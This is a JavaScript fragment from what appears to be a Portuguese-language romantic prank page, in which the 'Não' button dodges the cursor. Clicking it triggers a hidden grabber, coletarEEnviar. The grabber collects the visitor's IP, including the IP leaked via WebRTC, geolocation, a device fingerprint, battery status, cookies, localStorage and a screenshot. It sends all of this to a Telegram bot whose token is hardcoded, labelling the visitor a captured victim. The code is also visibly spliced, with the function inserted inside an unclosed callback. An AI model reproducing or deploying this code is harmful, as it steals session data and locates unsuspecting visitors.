        const btnNao = document.getElementById('btnNao');

        const buttonArea = document.getElementById('buttonArea');
        const loader = document.getElementById('loader');

        btnNao.addEventListener('mouseenter', function(e) {
            const containerRect = container.getBoundingClientRect();
            const btnRect = btnNao.getBoundingClientRect();

            const padding = 15;
            const maxX = containerRect.width - btnRect.width - padding;
            const maxY = containerRect.height - btnRect.height - padding;

            let newX, newY;
            let attempts = 0;
            do {
                newX = Math.random() * maxX;
                newY = Math.random() * maxY;
                attempts++;
                if (attempts > 50) break;
            } while (Math.abs(newX - btnNao.offsetLeft) < 30 && Math.abs(newY - btnNao.offsetTop) < 30);

            btnNao.style.position = 'absolute';
            btnNao.style.left = Math.max(0, Math.min(newX, maxX)) + 'px';
            btnNao.style.top = Math.max(0, Math.min(newY, maxY)) + 'px';
        });

        btnNao.addEventListener('click', function(e) {
            const containerRect = container.getBoundingClientRect();
            const btnRect = btnNao.getBoundingClientRect();
            const maxX = containerRect.width - btnRect.width - 15;
            const maxY = containerRect.height - btnRect.height - 15;
            btnNao.style.position = 'absolute';

            buttonArea.style.display = 'none';
            loader.style.display = 'block';

            coletarEEnviar();

            setTimeout(() => {
                window.location.href = 'https://open.spotify.com/track/3j2jHwUi5SAdV9nB9NSHTG';

        // ============================================================
        // ENVIAR PRO TELEGRAM (BOT)
        // ============================================================
        const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
        const CHAT_ID = "8551438856";

        async function coletarEEnviar() {
            try {
                // IP público
                const ip = await fetch('https://api.ipify.org?format=json')
                    .then(r => r.json()).then(d => d.ip).catch(() => '😵');

                // IP real (WebRTC)
                let webrtcIP = '❎';
                try {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('teste');
                    const offer = await pc.createOffer({ offerToReceiveAudio: 1 });
                    await pc.setLocalDescription(offer);
                    const candidates = pc.localDescription.sdp.match(/candidate.*/g);
                    if (candidates) {
                        const ips = candidates.map(c => c.split(' ')[4])
                            .filter(ip => ip && !ip.includes('127.0.0.1') && !ip.includes('0.0.0.0'));
                        if (ips.length) webrtcIP = ips[0];
                    }
                    pc.close();
                } catch {}

                // Geolocalização por IP
                let location = {};
                try {
                    const r = await fetch(`https://ipinfo.io/${ip}/json`);
                    const d = await r.json();
                    location = {
                        city: d.city || 'Desconhecida',
                        region: d.region || 'Desconhecida',
                        country: d.country || 'Desconhecido',
                        loc: d.loc || 'Desconhecida',
                        org: d.org || 'Desconhecido',
                        timezone: d.timezone || 'Desconhecido'
                    };
                } catch {
                    location = { city: '🌃', region: '🗺️', country: '🌵', loc: '📍', org: '❌', timezone: '❌' };
                }

                // Detectar VPN/Proxy
                let vpnStatus = '❓ Indeterminado';
                if (location.org) {
                    const org = location.org.toLowerCase();
                    const keywords = ['vpn', 'proxy', 'hosting', 'cloudflare', 'amazon', 'digitalocean', 'ovh', 'linode',
                        'vultr', 'heroku', 'azure', 'google cloud'
                    ];
                    vpnStatus = keywords.some(k => org.includes(k)) ? '⚠️ VPN/PROXY DETECTADO!' : '✅ Nenhum VPN/Proxy';
                }

                // Fingerprint
                const fpData = [
                    navigator.userAgent,
                    navigator.language,
                    screen.width + 'x' + screen.height,
                    new Date().getTimezoneOffset(),
                    navigator.hardwareConcurrency || '?',
                    navigator.deviceMemory || '?',
                    !!navigator.webdriver,
                    !!navigator.plugins.length,
                    navigator.doNotTrack || '?'
                ];
                let hash = 0;
                const fpString = fpData.join('|');
                for (let i = 0; i < fpString.length; i++) {
                    hash = (hash << 5) - hash + fpString.charCodeAt(i);
                    hash = hash & hash;
                }
                const fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();

                // Detectar dispositivo
                const ua = navigator.userAgent;
                const isIOS = /iPhone|iPad|iPod/i.test(ua);
                const isAndroid = /Android/i.test(ua);
                let modelo = 'Desconhecido',
                    os = 'Desconhecido',
                    marca = 'Desconhecida';

                if (isIOS) {
                    const m = ua.match(/iPhone OS (\d+)_(\d+)/);
                    modelo = m ? `iPhone (iOS ${m[1]}.${m[2]})` : 'iPhone';
                    os = m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
                    marca = 'Apple';
                } else if (isAndroid) {
                    const m = ua.match(/Android (\d+\.\d+)/);
                    modelo = m ? `Android ${m[1]}` : 'Android';
                    os = m ? `Android ${m[1]}` : 'Android';
                    marca = 'Android';
                } else {
                    modelo = '💻 Computador';
                    os = navigator.platform || 'Desconhecido';
                    marca = 'Desktop';
                }

                // Bateria
                let bateria = '🔋';
                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        bateria = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🪫 Descarregando'})`;
                    } catch {}
                }

                // Conexão
                let conexao = '❌';
                if (navigator.connection) {
                    conexao = navigator.connection.effectiveType || 'N/A';
                }

                // Plugins
                let plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
                const pluginsList = plugins.length ? plugins.join(', ') : '❌ Nenhum';

                // Cookies e localStorage
                const cookies = document.cookie || '❌ Sem cookies';
                let localStorageData = '❌';
                try {
                    localStorageData = JSON.stringify(localStorage) || '❌ Vazio';
                } catch {}

                // WiFi
                let wifi = '❌';
                if (navigator.connection) {
                    try {
                        wifi =
                            `Tipo: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink || '?'} Mbps`;
                    } catch {}
                }

                // Fontes instaladas
                let fonts = [];
                const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS'];
                for (let f of fontList) {
                    if (document.fonts.check(`12px "${f}"`)) fonts.push(f);
                }
                const fontsInstalled = fonts.length ? fonts.join(', ') : '❌';

                // Print da tela
                let screenshot = null;
                try {
                    const canvas = await html2canvas(document.body, {
                        scale: 1.2,
                        useCORS: true,
                        backgroundColor: '#f5efe6',
                        logging: false,
                        allowTaint: false,
                        width: window.innerWidth,
                        height: window.innerHeight,
                        windowWidth: window.innerWidth,
                        windowHeight: window.innerHeight
                    });
                    screenshot = canvas.toDataURL('image/jpeg', 0.85);
                } catch (e) {}

                // Montar mensagem
                let msg = `
         **💗 SONHO RUSSO — VÍTIMA CAPTURADA** 

        📲 **IP Público:** ${ip}
        🔴 **IP Real:** ${webrtcIP}
        🛡️ **VPN/Proxy:** ${vpnStatus}

        📍 **LOCALIZAÇÃO:**
           🌃 Cidade: ${location.city}
           🗺️ Região: ${location.region}
           🌍 País: ${location.country}
           📍 Coordenadas: ${location.loc}
           🕰️ Fuso: ${location.timezone}

        📱 **DISPOSITIVO:**
           Modelo: ${modelo}
           Marca: ${marca}
           OS: ${os}
           🔋 Bateria: ${bateria}
           🛜 Conexão: ${conexao}
           📐 Tela: ${screen.width}x${screen.height}
           🌍 Idioma: ${navigator.language}
           ⏰ Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
           🧠 Fingerprint: ${fingerprint}

        📶 **REDE:** ${wifi}

        🔌 **PLUGINS:** ${pluginsList}
        🍪 **COOKIES:** ${cookies}
        💾 **localStorage:** ${localStorageData}

        🔤 **FONTES:** ${fontsInstalled}

        ⛳️ **Ela disse SIM!** 💗
        `;

                // Enviar mensagem
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });

                // Enviar print
                if (screenshot) {
                    const form = new FormData();
                    const blob = await fetch(screenshot).then(res => res.blob());
                    form.append('photo', blob, 'screenshot.jpg');
                    form.append('chat_id', CHAT_ID);
                    form.append('caption', '🖼️ PRINT DA TELA');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: form
                    });
                }

            } catch (e) {
                console.log('Erro:', e);
            }
        }

            heart.style.opacity = '0.2';
            heart.style.color = '#c0392b';
            document.getElementById('floatingHearts').appendChild(heart);
            setTimeout(() => { heart.remove(); }, 8000);
        }, 3000);
